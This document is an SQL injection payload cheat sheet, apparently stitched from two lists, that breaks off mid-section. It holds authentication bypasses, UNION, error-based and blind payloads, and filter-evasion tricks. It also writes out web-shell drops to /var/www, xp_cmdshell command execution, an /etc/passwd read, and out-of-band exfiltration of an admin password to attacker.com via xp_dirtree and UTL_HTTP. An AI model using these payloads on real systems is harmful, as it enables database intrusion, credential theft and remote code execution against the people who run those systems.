

# SQL Injection (SQLi) Payloads List

Below is a collection of common SQL injection payloads categorized by attack type and database technology.

## Basic Authentication Bypass

```
' OR '1'='1
' OR 1=1 --
' OR 1=1 #
admin' --
admin' #
admin'/*
admin' OR '1'='1
```

## Union-Based Attacks

```
UNION SELECT null,username,password FROM users--
UNION SELECT 1,2,3,4--
UNION ALL SELECT database(),user(),version()--
```

## Error-Based Attacks

```
AND (SELECT 0 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
AND GTID_SUBSET(CONCAT(0x7e,(SELECT USER()),0x7e),0)
EXTRACTVALUE(rand(),concat(0x3a,(select database())))
```

## Boolean-Based Blind SQLi

```
AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'
AND ASCII(SUBSTRING((SELECT database()),1,1))>100
```

## Time-Based Blind SQLi

```
IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)
; WAITFOR DELAY '0:0:5' --
OR (SELECT * FROM (SELECT(SLEEP(5)))a)
```

## Database-Specific Payloads

### MySQL
```
@@version
LOAD_FILE('/etc/passwd')
INTO OUTFILE '/var/www/html/shell.php'
CONNECTION_ID()
```

### MSSQL
```
@@SERVERNAME
xp_cmdshell('whoami')
WAITFOR DELAY '0:0:5'
```

### Oracle
```
(SELECT banner FROM v$version WHERE rownum=1)
UTL_HTTP.REQUEST('http://attacker.com')
DBMS_LOCK.SLEEP(5)
```

### PostgreSQL
```
current_database()
pg_sleep(5)
COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php'
```


---

### **2. UNION-Based Attacks**
Extract data from other tables using `UNION SELECT`:
```sql
' UNION SELECT 1,2,3 -- 
' UNION SELECT username, password, NULL FROM users -- 
```

---

### **3. Error-Based SQLi**
Trigger database errors to extract information:
```sql
' AND (SELECT 0 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- 
```

---

### **4. Boolean-Based Blind SQLi**
True/False conditions to infer data:
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)='a' -- 
```

---

### **5. Time-Based Blind SQLi**
Delay-based inference:
```sql
'; IF (SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)='a') WAITFOR DELAY '0:0:5' -- 
```

---

### **6. Out-of-Band Data Exfiltration**
Exfiltrate data via DNS/HTTP requests:
```sql
'; DECLARE @data VARCHAR(1024); SET @data=(SELECT password FROM users WHERE username='admin'); EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\share"') -- 
```

---

### **7. File System Access**
Read/write files (if DB permissions allow):
```sql
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL, NULL -- 
'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php' -- 
```


---

### **8. Database-Specific Payloads (Continued)**

#### **MySQL / MariaDB (Continued)**
```sql
-- List tables in current database  
SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE()  

-- List columns in a table  
SELECT column_name FROM information_schema.columns WHERE table_name = 'users'  

-- String concatenation  
SELECT CONCAT(username, ':', password) FROM users  

-- Conditional time delay  
SELECT IF(1=1, SLEEP(5), 0)  
```

#### **PostgreSQL**
```sql
-- Version check  
SELECT version()  

-- List databases  
SELECT datname FROM pg_database  

-- List tables  
SELECT table_name FROM information_schema.tables  

-- String concatenation  
SELECT username || ':' || password FROM users  

-- Conditional time delay  
SELECT pg_sleep(5) FROM users WHERE username='admin'  
```

#### **Microsoft SQL Server**
```sql
-- Version check  
SELECT @@version  

-- List databases  
SELECT name FROM master..sysdatabases  

-- List tables in current DB  
SELECT table_name FROM information_schema.tables  

-- Conditional time delay (SQL Server)  
IF (1=1) WAITFOR DELAY '0:0:5'  

-- Command execution (if xp_cmdshell enabled)  
EXEC xp_cmdshell 'whoami'  
```

#### **Oracle**
```sql
-- Version check  
SELECT * FROM v$version  

-- List tables owned by current user  
SELECT table_name FROM user_tables  

-- String concatenation  
SELECT username || ':' || password FROM users  

-- Conditional time delay (DBMS_LOCK.SLEEP requires privileges)  
BEGIN DBMS_LOCK.SLEEP(5); END; -- 
```

---

### **9. Bypassing WAF/Filtering Techniques**

```sql
/* Case switching */
' UnIoN SeLeCt 1,2,3 -- 

/* Whitespace alternatives */
'UNION/**/SELECT/**/1,2,3--

/* Comment obfuscation */
' UNION SELECT/*random*/1,password/*random*/FROM users--

/* Hex encoding */
' UNION SELECT 0x61646d696e,2,3 --  /* "admin" in hex */

/* CHAR() function */
